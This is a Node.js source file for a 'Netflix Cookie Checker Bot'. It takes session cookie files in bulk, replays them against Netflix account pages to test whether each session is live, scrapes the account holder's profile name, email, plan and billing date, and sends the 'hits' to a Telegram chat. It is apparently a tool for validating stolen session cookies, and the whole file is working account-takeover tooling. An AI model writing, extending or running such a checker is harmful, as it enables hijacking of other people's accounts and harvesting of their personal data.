// index.js
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { CronJob } = require('cron');

const app = express();
app.use(express.json());
app.use(express.text());

// ==================== CONFIGURATION ====================
const CONFIG = {
    PORT: process.env.PORT || 3000,
    BOT_TOKEN: process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE', // Set this in Render environment variables!
    CHAT_ID: process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE',       // Set this in Render!
    AUTO_PING_URL: process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 3000}`,
    CHECK_DELAY_MS: 2000,
    USER_AGENT: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
};

// In-memory storage (no database)
let checkResults = [];

// ==================== HELPER FUNCTIONS ====================
function parseNetscapeCookie(cookieContent) {
    const cookies = {};
    const lines = cookieContent.split('\n');
    
    for (const line of lines) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#') || trimmed.startsWith('HttpOnly')) continue;
        
        const parts = trimmed.split('\t');
        if (parts.length >= 7) {
            // Netscape format: domain, flag, path, secure, expiration, name, value
            const name = parts[5];
            const value = parts[6];
            cookies[name] = value;
        } else if (trimmed.includes('=') && !trimmed.startsWith('#')) {
            const [name, value] = trimmed.split('=');
            cookies[name.trim()] = value.trim();
        }
    }
    return cookies;
}

async function checkNetflixCookies(cookiesDict) {
    const headers = {
        "User-Agent": CONFIG.USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    };
    
    const jar = axios.create({
        headers: headers,
        maxRedirects: 5,
        timeout: 15000
    });
    
    // Set cookies
    for (const [name, value] of Object.entries(cookiesDict)) {
        jar.defaults.headers.Cookie = (jar.defaults.headers.Cookie || '') + `${name}=${value}; `;
    }
    
    try {
        // First request to browse page
        const response = await jar.get('https://www.netflix.com/browse');
        const pageContent = response.data;
        
        // Check if redirected to login
        if (response.request.res.responseUrl && 
            (response.request.res.responseUrl.includes('/login') || 
             response.request.res.responseUrl.includes('/signup'))) {
            return { valid: false, error: "Cookies expired - Redirected to login" };
        }
        
        if (response.status !== 200) {
            return { valid: false, error: `HTTP ${response.status}` };
        }
        
        // Extract profile information
        const profileMatch = pageContent.match(/"profileName":"([^"]+)"/);
        const emailMatch = pageContent.match(/"email":"([^"]+)"/);
        const accountMatch = pageContent.match(/"accountOwner":"([^"]+)"/);
        
        let profileInfo = {
            profile_name: profileMatch ? profileMatch[1] : "Unknown",
            email: emailMatch ? emailMatch[1] : "Unknown",
            account_owner: accountMatch ? accountMatch[1] : "Unknown"
        };
        
        // Try to get subscription info
        try {
            const accountResponse = await jar.get('https://www.netflix.com/YourAccount');
            if (accountResponse.status === 200) {
                const accountText = accountResponse.data;
                
                const plans = ['Premium', 'Standard', 'Basic', 'Mobile'];
                for (const plan of plans) {
                    if (accountText.match(new RegExp(plan, 'i'))) {
                        profileInfo.plan = plan;
                        break;
                    }
                }
                if (!profileInfo.plan) profileInfo.plan = "Unknown";
                
                const billingMatch = accountText.match(/Next billing date:.*?(\d{1,2}\/\d{1,2}\/\d{4})/i);
                if (billingMatch) profileInfo.next_billing = billingMatch[1];
            }
        } catch (e) {
            profileInfo.plan = "Unknown";
        }
        
        return { valid: true, info: profileInfo };
        
    } catch (error) {
        return { valid: false, error: error.message };
    }
}

async function sendTelegramMessage(message) {
    if (!CONFIG.BOT_TOKEN || CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.log('⚠️ Telegram bot not configured. Message:', message.substring(0, 200));
        return false;
    }
    
    try {
        const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: CONFIG.CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        return true;
    } catch (error) {
        console.error('Telegram send error:', error.message);
        return false;
    }
}

function formatResultMessage(fileName, result, index, total) {
    if (result.valid) {
        const info = result.info;
        return `✅ <b>VALID SESSION ${index}/${total}</b>\n` +
               `📄 File: ${fileName}\n` +
               `👤 Profile: ${info.profile_name}\n` +
               `📧 Email: ${info.email}\n` +
               `💳 Plan: ${info.plan || 'Unknown'}\n` +
               `${info.next_billing ? `📅 Next Billing: ${info.next_billing}\n` : ''}` +
               `🕐 Time: ${new Date().toLocaleString()}`;
    } else {
        return `❌ <b>INVALID SESSION ${index}/${total}</b>\n` +
               `📄 File: ${fileName}\n` +
               `⚠️ Error: ${result.error || 'Invalid cookies'}\n` +
               `🕐 Time: ${new Date().toLocaleString()}`;
    }
}

// ==================== CORE CHECKING FUNCTION ====================
async function checkCookiesAndReport(cookieFilesData) {
    const results = [];
    let validCount = 0;
    let invalidCount = 0;
    let errorCount = 0;
    
    const total = cookieFilesData.length;
    
    await sendTelegramMessage(`🔍 <b>Netflix Cookie Checker Started</b>\n📁 Total files: ${total}\n⏰ ${new Date().toLocaleString()}`);
    
    for (let i = 0; i < total; i++) {
        const { name, content } = cookieFilesData[i];
        const cookies = parseNetscapeCookie(content);
        
        if (Object.keys(cookies).length === 0) {
            const result = { valid: false, error: "No cookies found in file" };
            results.push({ fileName: name, ...result });
            invalidCount++;
            
            const msg = formatResultMessage(name, result, i+1, total);
            await sendTelegramMessage(msg);
            continue;
        }
        
        // Check essential Netflix cookies
        const essential = ['secureNetflixId', 'NetflixId', 'SecureNetflixId'];
        const hasEssential = essential.some(c => cookies[c]);
        if (!hasEssential) {
            console.log(`⚠️ ${name}: Missing essential Netflix cookies`);
        }
        
        const checkResult = await checkNetflixCookies(cookies);
        
        if (checkResult.valid) {
            validCount++;
            results.push({ fileName: name, valid: true, info: checkResult.info });
        } else if (checkResult.error && 
                  (checkResult.error.toLowerCase().includes('expired') || 
                   checkResult.error.toLowerCase().includes('invalid'))) {
            invalidCount++;
            results.push({ fileName: name, valid: false, error: checkResult.error });
        } else {
            errorCount++;
            results.push({ fileName: name, valid: false, error: checkResult.error });
        }
        
        const msg = formatResultMessage(name, checkResult, i+1, total);
        await sendTelegramMessage(msg);
        
        // Delay between checks
        if (i < total - 1) {
            await new Promise(resolve => setTimeout(resolve, CONFIG.CHECK_DELAY_MS));
        }
    }
    
    // Send summary
    const summary = `📊 <b>CHECK COMPLETE</b>\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `📄 Total files: ${total}\n` +
                    `✅ Valid: ${validCount}\n` +
                    `❌ Invalid: ${invalidCount}\n` +
                    `⚠️ Errors: ${errorCount}\n` +
                    `📈 Success: ${total > 0 ? ((validCount/total)*100).toFixed(1) : 0}%\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `🕐 ${new Date().toLocaleString()}`;
    
    await sendTelegramMessage(summary);
    
    // Generate TXT file with all hits
    const txtContent = generateTxtReport(results, validCount, invalidCount, errorCount, total);
    const txtFileName = `netflix_hits_${Date.now()}.txt`;
    fs.writeFileSync(txtFileName, txtContent);
    
    // Send the TXT file via Telegram
    await sendTxtFile(txtFileName);
    
    // Clean up file after sending
    fs.unlinkSync(txtFileName);
    
    return { results, validCount, invalidCount, errorCount };
}

function generateTxtReport(results, validCount, invalidCount, errorCount, total) {
    let content = '=' .repeat(60) + '\n';
    content += 'NETFLIX COOKIE CHECKER - ALL HITS REPORT\n';
    content += `Generated: ${new Date().toLocaleString()}\n`;
    content += '=' .repeat(60) + '\n\n';
    
    content += `📊 SUMMARY\n`;
    content += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    content += `Total files checked: ${total}\n`;
    content += `✅ Valid sessions: ${validCount}\n`;
    content += `❌ Invalid/Expired: ${invalidCount}\n`;
    content += `⚠️ Errors: ${errorCount}\n`;
    content += `Success rate: ${total > 0 ? ((validCount/total)*100).toFixed(1) : 0}%\n\n`;
    
    content += '🎯 VALID SESSIONS DETAILS\n';
    content += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
    
    const validResults = results.filter(r => r.valid);
    if (validResults.length > 0) {
        for (const r of validResults) {
            content += `\n📄 File: ${r.fileName}\n`;
            content += `   👤 Profile: ${r.info.profile_name}\n`;
            content += `   📧 Email: ${r.info.email}\n`;
            content += `   💳 Plan: ${r.info.plan || 'Unknown'}\n`;
            if (r.info.next_billing) content += `   📅 Next Billing: ${r.info.next_billing}\n`;
            content += `   ✅ Status: VALID\n`;
            content += `   🕐 Checked: ${new Date().toLocaleString()}\n`;
            content += '-' .repeat(40) + '\n';
        }
    } else {
        content += '\n   No valid sessions found.\n';
    }
    
    content += '\n\n❌ INVALID/EXPIRED SESSIONS\n';
    content += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
    
    const invalidResults = results.filter(r => !r.valid && r.error && 
        (r.error.toLowerCase().includes('expired') || r.error.toLowerCase().includes('invalid')));
    if (invalidResults.length > 0) {
        for (const r of invalidResults) {
            content += `\n📄 File: ${r.fileName}\n`;
            content += `   ❌ Error: ${r.error}\n`;
            content += '-' .repeat(40) + '\n';
        }
    }
    
    content += '\n\n⚠️ ERRORS\n';
    content += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
    
    const errorResults = results.filter(r => !r.valid && r.error && 
        !r.error.toLowerCase().includes('expired') && !r.error.toLowerCase().includes('invalid'));
    if (errorResults.length > 0) {
        for (const r of errorResults) {
            content += `\n📄 File: ${r.fileName}\n`;
            content += `   ⚠️ Error: ${r.error}\n`;
            content += '-' .repeat(40) + '\n';
        }
    }
    
    content += '\n' + '=' .repeat(60) + '\n';
    content += 'End of Report\n';
    content += '=' .repeat(60) + '\n';
    
    return content;
}

async function sendTxtFile(filePath) {
    if (!CONFIG.BOT_TOKEN || CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.log('⚠️ Cannot send TXT file: Telegram bot not configured');
        return;
    }
    
    try {
        const fileContent = fs.readFileSync(filePath);
        const formData = new FormData();
        formData.append('chat_id', CONFIG.CHAT_ID);
        formData.append('document', new Blob([fileContent]), path.basename(filePath));
        
        const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendDocument`;
        await axios.post(url, formData, {
            headers: { 'Content-Type': 'multipart/form-data' }
        });
        console.log(`📁 TXT report sent: ${filePath}`);
    } catch (error) {
        console.error('Failed to send TXT file:', error.message);
    }
}

// ==================== AUTO-PING FUNCTION ====================
function startAutoPing() {
    // Ping every 4 minutes to keep the service alive
    const pingInterval = setInterval(async () => {
        try {
            const pingUrl = `${CONFIG.AUTO_PING_URL}/ping`;
            const response = await axios.get(pingUrl, { timeout: 5000 });
            console.log(`💓 Auto-ping sent at ${new Date().toLocaleTimeString()} - Status: ${response.status}`);
        } catch (error) {
            console.log(`⚠️ Auto-ping failed: ${error.message}`);
        }
    }, 4 * 60 * 1000); // 4 minutes
    
    return pingInterval;
}

// ==================== EXPRESS ROUTES ====================
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Netflix Cookie Checker Bot</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; background: #141414; color: #fff; }
                .container { background: #2d2d2d; padding: 30px; border-radius: 10px; }
                h1 { color: #e50914; }
                .status { background: #333; padding: 15px; border-radius: 5px; margin: 20px 0; }
                .endpoint { background: #000; padding: 10px; border-radius: 5px; font-family: monospace; }
                button { background: #e50914; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
                button:hover { background: #f6121d; }
                #result { margin-top: 20px; white-space: pre-wrap; background: #333; padding: 15px; border-radius: 5px; display: none; }
                input, textarea { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
                .footer { margin-top: 30px; font-size: 12px; color: #888; text-align: center; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🎬 Netflix Cookie Checker Bot</h1>
                <p>Send cookies file content via Telegram or upload below</p>
                
                <div class="status">
                    <strong>🤖 Bot Status:</strong> 🟢 Online<br>
                    <strong>📡 Auto-Ping:</strong> 🟢 Active (every 4 minutes)<br>
                    <strong>🕐 Server Time:</strong> ${new Date().toLocaleString()}
                </div>
                
                <h3>📤 Upload Cookie File (Netscape format)</h3>
                <input type="file" id="cookieFile" accept=".txt,.cookie,.netscape">
                <button onclick="uploadFile()">Check Cookies</button>
                
                <h3>📝 Or Paste Cookie Content</h3>
                <textarea id="cookieContent" rows="5" placeholder="# Netscape HTTP Cookie File&#10;.netflix.com	TRUE	/	FALSE	1700000000	secureNetflixId	YOUR_VALUE_HERE"></textarea>
                <button onclick="checkPasted()">Check Pasted Cookies</button>
                
                <div id="result"></div>
                
                <div class="footer">
                    <strong>Telegram Bot:</strong> Send <code>.txt</code>, <code>.cookie</code>, or <code>.netscape</code> files directly to the bot<br>
                    🔗 <a href="https://t.me/NetflixCookieCheckerBot" style="color:#e50914">@NetflixCookieCheckerBot</a> (replace with your bot username)
                </div>
            </div>
            
            <script>
                async function uploadFile() {
                    const fileInput = document.getElementById('cookieFile');
                    const file = fileInput.files[0];
                    if (!file) {
                        alert('Please select a file');
                        return;
                    }
                    
                    const formData = new FormData();
                    formData.append('file', file);
                    
                    document.getElementById('result').style.display = 'block';
                    document.getElementById('result').innerHTML = '⏳ Checking cookies...';
                    
                    const response = await fetch('/check-file', {
                        method: 'POST',
                        body: formData
                    });
                    const result = await response.json();
                    
                    if (result.valid) {
                        document.getElementById('result').innerHTML = \`
                            <div style="background:#1a4d1a; padding:15px; border-radius:5px;">
                                ✅ <strong>VALID SESSION</strong><br>
                                👤 Profile: \${result.info.profile_name}<br>
                                📧 Email: \${result.info.email}<br>
                                💳 Plan: \${result.info.plan || 'Unknown'}<br>
                                \${result.info.next_billing ? '📅 Next Billing: ' + result.info.next_billing + '<br>' : ''}
                                🕐 Time: \${new Date().toLocaleString()}
                            </div>
                        \`;
                    } else {
                        document.getElementById('result').innerHTML = \`
                            <div style="background:#4a1a1a; padding:15px; border-radius:5px;">
                                ❌ <strong>INVALID SESSION</strong><br>
                                ⚠️ Error: \${result.error || 'Invalid cookies'}<br>
                                🕐 Time: \${new Date().toLocaleString()}
                            </div>
                        \`;
                    }
                }
                
                async function checkPasted() {
                    const content = document.getElementById('cookieContent').value;
                    if (!content.trim()) {
                        alert('Please paste cookie content');
                        return;
                    }
                    
                    document.getElementById('result').style.display = 'block';
                    document.getElementById('result').innerHTML = '⏳ Checking cookies...';
                    
                    const response = await fetch('/check-paste', {
                        method: 'POST',
                        headers: { 'Content-Type': 'text/plain' },
                        body: content
                    });
                    const result = await response.json();
                    
                    if (result.valid) {
                        document.getElementById('result').innerHTML = \`
                            <div style="background:#1a4d1a; padding:15px; border-radius:5px;">
                                ✅ <strong>VALID SESSION</strong><br>
                                👤 Profile: \${result.info.profile_name}<br>
                                📧 Email: \${result.info.email}<br>
                                💳 Plan: \${result.info.plan || 'Unknown'}<br>
                                \${result.info.next_billing ? '📅 Next Billing: ' + result.info.next_billing + '<br>' : ''}
                                🕐 Time: \${new Date().toLocaleString()}
                            </div>
                        \`;
                    } else {
                        document.getElementById('result').innerHTML = \`
                            <div style="background:#4a1a1a; padding:15px; border-radius:5px;">
                                ❌ <strong>INVALID SESSION</strong><br>
                                ⚠️ Error: \${result.error || 'Invalid cookies'}<br>
                                🕐 Time: \${new Date().toLocaleString()}
                            </div>
                        \`;
                    }
                }
            </script>
        </body>
        </html>
    `);
});

app.get('/ping', (req, res) => {
    res.status(200).json({ status: 'alive', timestamp: new Date().toISOString() });
});

app.post('/check-file', async (req, res) => {
    if (!req.files || !req.files.file) {
        return res.status(400).json({ error: 'No file uploaded' });
    }
    
    const file = req.files.file;
    const content = file.data.toString('utf-8');
    const cookies = parseNetscapeCookie(content);
    
    if (Object.keys(cookies).length === 0) {
        return res.json({ valid: false, error: 'No valid cookies found in file' });
    }
    
    const result = await checkNetflixCookies(cookies);
    res.json(result);
});

app.post('/check-paste', async (req, res) => {
    const content = req.body;
    if (!content || typeof content !== 'string') {
        return res.status(400).json({ error: 'No content provided' });
    }
    
    const cookies = parseNetscapeCookie(content);
    if (Object.keys(cookies).length === 0) {
        return res.json({ valid: false, error: 'No valid cookies found in content' });
    }
    
    const result = await checkNetflixCookies(cookies);
    res.json(result);
});

// Telegram webhook endpoint
app.post(`/webhook/${CONFIG.BOT_TOKEN}`, async (req, res) => {
    try {
        const update = req.body;
        
        if (update.message && update.message.document) {
            // File received
            const fileId = update.message.document.file_id;
            const chatId = update.message.chat.id;
            const fileName = update.message.document.file_name;
            
            // Download file from Telegram
            const fileUrl = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getFile?file_id=${fileId}`;
            const fileInfo = await axios.get(fileUrl);
            const filePath = fileInfo.data.result.file_path;
            const downloadUrl = `https://api.telegram.org/file/bot${CONFIG.BOT_TOKEN}/${filePath}`;
            
            const fileContent = await axios.get(downloadUrl, { responseType: 'text' });
            
            // Check the cookies
            const cookies = parseNetscapeCookie(fileContent.data);
            let result;
            
            if (Object.keys(cookies).length === 0) {
                result = { valid: false, error: 'No valid cookies found in file' };
            } else {
                result = await checkNetflixCookies(cookies);
            }
            
            // Send result back
            let reply;
            if (result.valid) {
                reply = `✅ VALID SESSION!\n\n👤 Profile: ${result.info.profile_name}\n📧 Email: ${result.info.email}\n💳 Plan: ${result.info.plan || 'Unknown'}\n${result.info.next_billing ? `📅 Next Billing: ${result.info.next_billing}\n` : ''}\n📁 File: ${fileName}`;
            } else {
                reply = `❌ INVALID SESSION!\n\n⚠️ Error: ${result.error || 'Invalid cookies'}\n📁 File: ${fileName}`;
            }
            
            await axios.post(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                chat_id: chatId,
                text: reply
            });
            
        } else if (update.message && update.message.text) {
            const text = update.message.text;
            const chatId = update.message.chat.id;
            
            if (text.startsWith('/start')) {
                await axios.post(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: '🎬 Welcome to Netflix Cookie Checker Bot!\n\nSend me a .txt, .cookie, or .netscape file containing Netflix cookies in Netscape format, and I will check if they are valid.\n\nExample format:\n.netflix.com\tTRUE\t/\tFALSE\t1700000000\tsecureNetflixId\tYOUR_VALUE\n\nMade with ❤️ by @deadlinehere5'
                });
            } else if (text.startsWith('/check')) {
                // Handle bulk check from folder (if files are provided in a zip or multiple)
                await axios.post(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: 'Please send cookie files one by one, or send a .zip archive containing multiple .txt files.'
                });
            }
        }
        
        res.sendStatus(200);
    } catch (error) {
        console.error('Webhook error:', error);
        res.sendStatus(200);
    }
});

// ==================== FILE UPLOAD MIDDLEWARE ====================
const fileUpload = require('express-fileupload');
app.use(fileUpload());

// ==================== START SERVER ====================
const server = app.listen(CONFIG.PORT, () => {
    console.log(`
    ┌─────────────────────────────────────────────────┐
    │  🎬 NETFLIX COOKIE CHECKER BOT                  │
    │  ─────────────────────────────────────────────  │
    │  Server running on port ${CONFIG.PORT}              │
    │  Web UI: http://localhost:${CONFIG.PORT}           │
    │  Auto-Ping: Active (every 4 minutes)            │
    │  Telegram Bot: ${CONFIG.BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' ? '✅ Configured' : '⚠️ Not configured'} │
    └─────────────────────────────────────────────────┘
    `);
    
    // Start auto-ping to keep service alive
    startAutoPing();
    
    // Set up webhook for Telegram (if token configured)
    if (CONFIG.BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && CONFIG.RENDER_EXTERNAL_URL) {
        const webhookUrl = `${CONFIG.RENDER_EXTERNAL_URL}/webhook/${CONFIG.BOT_TOKEN}`;
        axios.post(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/setWebhook`, {
            url: webhookUrl
        }).then(response => {
            console.log(`🔗 Telegram webhook set: ${response.data.ok ? '✅ Success' : '❌ Failed'}`);
        }).catch(err => {
            console.log('⚠️ Webhook setup failed:', err.message);
        });
    }
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('🛑 Received SIGTERM, shutting down gracefully...');
    server.close(() => {
        console.log('👋 Server closed');
        process.exit(0);
    });
});